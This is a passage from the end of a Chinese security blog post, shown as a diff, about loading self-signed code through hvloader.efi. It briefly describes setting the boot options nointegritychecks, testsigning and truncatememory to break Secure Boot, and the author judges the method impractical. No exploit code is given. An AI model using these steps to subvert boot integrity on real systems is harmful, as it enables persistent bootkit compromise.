+<blockquote>
+<p><code>truncatememory </code>将从内存映射中移除所有高于指定物理地址的内存。那么通过设置该选项，就可以删除<code>avoidlowmemory </code>。</p>
+<p>然后通过设置<code>nointegritychecks</code>、<code>testsigning</code>来破坏安全启动，之后就可以使用hvloader.efi来加载自签名的代码了。</p>
+</blockquote>
+<p><code>hvloader.efi</code>会识别运行平台，加载并执行<code>ESP:\system32</code>中的<code>mcupdate*.dll</code>：</p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230313141321996.png" alt="image-20230313141321996"></p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310111954329.png" alt="image-20230310111954329"></p>
+<p>这种修改方式需要修改、添加的文件太多，在实战过程中使用成功率较低，且无法免杀。</p>
+<p>总之随便看看就是了，没啥用。</p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/project/2023/08/09/CSM%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"
+      title="CSM原理学习"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        CSM原理学习
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/project/2023/08/09/MBR-Bootkit%E5%8E%9F%E7%90%86/"
+      title="MBR Bootkit原理"
+     >
+
+    <p class="title-text">
+      
+        MBR Bootkit原理
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+  
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <div id="comment-card" class="comment-card">
+    <div class="main-title-bar">
+      <div class="main-title-dot"></div>
+      <div class="main-title">留言 </div>
+    </div>
+    <div id="vcomments"></div>
+  </div>
+  <script>
+      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
+  </script>
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 Edvison<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/project/js/light-dark-switch.js"></script>
+</body>
+</html>
